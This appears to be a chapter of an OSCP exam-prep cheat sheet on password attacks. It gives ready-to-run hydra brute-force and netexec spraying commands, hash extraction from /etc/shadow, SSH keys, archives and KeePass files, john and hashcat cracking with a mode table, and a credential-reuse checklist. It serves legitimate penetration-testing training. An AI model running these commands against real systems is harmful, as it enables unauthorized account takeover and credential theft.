# 04 · Password attacks & cracking

Two jobs: guess credentials against a live service (online), and crack hashes/files you've looted
(offline). Password reuse is the connective tissue of most chains — try every credential everywhere.

> 🚩 **EXAM:** cracking (john/hashcat) and targeted brute-forcing (hydra) are allowed. Just don't
> point them recklessly at a login with a lockout policy (see §04.2).

---

## 4.1 Online brute-forcing (hydra)

```bash
hydra -l <user> -P rockyou.txt <ip> ssh
hydra -l <user> -P rockyou.txt ftp://<ip>
hydra -L users.txt -P rockyou.txt <ip> -s 8091 http-get /                # HTTP basic auth
hydra -l admin -P rockyou.txt <ip> http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -V
```

- `-l`/`-L` single user / user list · `-p`/`-P` single pass / list · `-s` port · `-t` threads · `-f` stop on first hit.
- For `http-post-form`, the third field is the **failure** string — get it exact or every attempt "succeeds".

**Build a target-specific wordlist from the site:**
```bash
cewl -d 4 -m 5 -w words.txt http://<ip>/            # spider the app for candidate words (-d depth)
```

## 4.2 Password spraying

One password across many users beats many passwords against one user (no lockout).
```bash
netexec smb <ip> -u users.txt -p 'Season2025!' --continue-on-success
```
> 💡 Pull the **lockout threshold** first (`enum4linux-ng`, `net accounts`). Below it or spray slow —
> locking out a domain account on the exam is a self-inflicted wound.

## 4.3 Identify the hash

```bash
hashid '<hash>'          # or nth / name-that-hash
```
Recognize on sight: `$1$` md5crypt · `$5$` sha256crypt · `$6$` sha512crypt · `$2y$` bcrypt ·
`$P$`/`$H$` phpass (WordPress/Joomla) · 32 hex = NTLM/MD5 · `$krb5tgs$` Kerberoast · `$krb5asrep$` AS-REP.

## 4.4 Extract hashes from files/keys

```bash
ssh2john id_rsa > h        # putty2john for .ppk
zip2john a.zip > h ; rar2john a.rar > h ; 7z2john a.7z > h
office2john doc.docx > h ; pdf2john file.pdf > h ; keepass2john db.kdbx > h
unshadow /etc/passwd /etc/shadow > h      # Linux local hashes
```

## 4.5 Crack (john / hashcat)

```bash
# John — fastest when you don't know the mode (auto-detects)
john --wordlist=rockyou.txt h
john --show h

# Hashcat — need the mode (-m); add rules for mutations
hashcat -m <mode> h rockyou.txt -O -w 3
hashcat -m <mode> h rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> h rockyou.txt -a 6 '?d?d?d'        # hybrid: word + 3 digits
```

**Modes you actually meet on OSCP:**

| Hash | `-m` |
|---|---|
| md5crypt `$1$` | 500 |
| sha512crypt `$6$` | 1800 |
| bcrypt `$2*$` | 3200 |
| NTLM (SAM/secretsdump) | 1000 |
| NetNTLMv2 (Responder) | 5600 |
| Kerberoast `$krb5tgs$` | 13100 |
| AS-REP `$krb5asrep$` | 18200 |
| phpass (WordPress) `$P$` | 400 |
| SSH key passphrase | 22921 |
| KeePass | 13400 |
| ZIP (PKZIP / WinZip-AES) | 17200 / 13600 |
| Office 2013+ | 9600 |

> 💡 Hashcat output must be the hash **only** — strip the `filename:`/`user:` prefix that `*2john`
> tools prepend (`cut -d: -f2-`), or use `--username` to keep it.

## 4.6 Before you move on

- [ ] Every looted hash identified and thrown at rockyou + best64 rules at minimum.
- [ ] Every recovered/known password tried against **all** services and users (reuse!).
- [ ] Config files, backups, and `.bash_history` grepped for plaintext creds.
- [ ] SSH private keys tried against every user (and passphrase-cracked if encrypted).
